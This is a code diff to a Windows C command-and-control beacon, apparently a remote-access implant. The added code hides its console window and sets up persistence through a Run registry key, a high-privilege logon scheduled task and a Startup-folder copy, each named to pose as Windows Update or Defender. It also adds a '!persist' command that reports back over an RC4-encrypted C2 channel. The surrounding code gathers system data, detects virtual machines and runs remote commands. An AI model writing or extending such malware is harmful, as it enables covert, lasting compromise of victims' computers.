@@ -7,10 +7,12 @@
 #include <tlhelp32.h>
 #include <iphlpapi.h>
 #include <winternl.h>  // Add this for NT_SUCCESS
+#include <shlobj.h>
 
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "shell32.lib")
 
 char* get_system_info();
 char* get_process_list();
@@ -439,6 +441,20 @@ char* get_network_info() {
     
     strcat(net_info, "\n");
     return net_info;
+}
+
+// ==================== HIDE CONSOLE WINDOW ====================
+// This hides the console window while keeping the process running
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+
+// Alternative method using WinAPI
+void hide_console_window() {
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) {
+        ShowWindow(hWnd, SW_HIDE);  // Hide window
+        // Optional: Also minimize to tray
+        // ShowWindow(hWnd, SW_MINIMIZE);
+    }
 }
 
 // ==================== COMMAND EXECUTION ====================
@@ -879,10 +895,92 @@ char* bin_to_hex(const unsigned char* data, int len) {
     return hex;
 }
 
+
+// ==================== PERSISTENCE FUNCTIONS ====================
+
+int add_registry_persistence(const char* beacon_path) {
+    HKEY hKey;
+    LONG result;
+    
+    // Current user run key (survives logon)
+    result = RegOpenKeyExA(
+        HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0,
+        KEY_WRITE,
+        &hKey
+    );
+    
+    if (result != ERROR_SUCCESS) {
+        printf("[-] Failed to open registry key: %ld\n", result);
+        return 0;
+    }
+    
+    // Add registry entry
+    result = RegSetValueExA(
+        hKey,
+        "WindowsUpdateHelper",  // Disguised name
+        0,
+        REG_SZ,
+        (const BYTE*)beacon_path,
+        strlen(beacon_path) + 1
+    );
+    
+    RegCloseKey(hKey);
+    
+    if (result == ERROR_SUCCESS) {
+        printf("[+] Registry persistence added: %s\n", beacon_path);
+        return 1;
+    } else {
+        printf("[-] Failed to set registry value: %ld\n", result);
+        return 0;
+    }
+}
+
+int add_scheduled_task_persistence(const char* beacon_path) {
+    // Create a scheduled task that runs on logon
+    char command[1024];
+    
+    // Create task command
+    snprintf(command, sizeof(command),
+             "schtasks /create /tn \"WindowsDefenderScan\" /tr \"%s\" /sc onlogon /rl highest /f",
+             beacon_path);
+    
+    // Execute command
+    system(command);
+    
+    printf("[+] Scheduled task created (if admin)\n");
+    return 1;
+}
+
+int add_startup_folder_persistence(const char* beacon_path) {
+    // Alternative: Startup folder (requires copying file)
+    char startup_path[MAX_PATH];
+    char dest_path[MAX_PATH];
+    
+    // Get startup folder path
+    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
+        printf("[-] Failed to get startup folder path\n");
+        return 0;
+    }
+    
+    // Create destination path
+    snprintf(dest_path, sizeof(dest_path), "%s\\WindowsUpdate.exe", startup_path);
+    
+    // Copy beacon to startup folder
+    if (CopyFileA(beacon_path, dest_path, FALSE)) {
+        printf("[+] Beacon copied to startup folder: %s\n", dest_path);
+        return 1;
+    } else {
+        printf("[-] Failed to copy to startup folder: %ld\n", GetLastError());
+        return 0;
+    }
+}
+
 // ==================== BEACON MAIN ====================
 int main() {
 
-
+    hide_console_window();
     printf("[+] C2 Beacon Starting\n");
         if (ENABLE_VM_CHECKS) {
         if (check_virtual_machine()) {
@@ -1200,6 +1298,37 @@ int main() {
     processing_command = 0;
     last_checkin = time(NULL);
 }
+                        else if (strncmp(value_start, "!persist", 8) == 0) {
+                            printf("[+] Establishing persistence...\n");
+                            
+                            // Get current executable path
+                            char beacon_path[MAX_PATH];
+                            GetModuleFileNameA(NULL, beacon_path, MAX_PATH);
+                            
+                            char response[512];
+                            
+                            // Try registry persistence first
+                            if (add_registry_persistence(beacon_path)) {
+                                snprintf(response, sizeof(response),
+                                        "{\"type\":\"response\",\"status\":\"success\",\"message\":\"Registry persistence added\"}");
+                            }
+                            // Try startup folder as backup
+                            else if (add_startup_folder_persistence(beacon_path)) {
+                                snprintf(response, sizeof(response),
+                                        "{\"type\":\"response\",\"status\":\"success\",\"message\":\"Startup folder persistence added\"}");
+                            }
+                            else {
+                                snprintf(response, sizeof(response),
+                                        "{\"type\":\"response\",\"status\":\"error\",\"message\":\"Failed to establish persistence\"}");
+                            }
+                            
+                            char* encrypted = rc4_encrypt(response);
+                            send(sock, encrypted, strlen(encrypted), 0);
+                            free(encrypted);
+                            
+                            processing_command = 0;
+                            last_checkin = time(NULL);
+                        }
                         else {
                             // Regular command execution
                             char* result = execute_system_command(value_start);
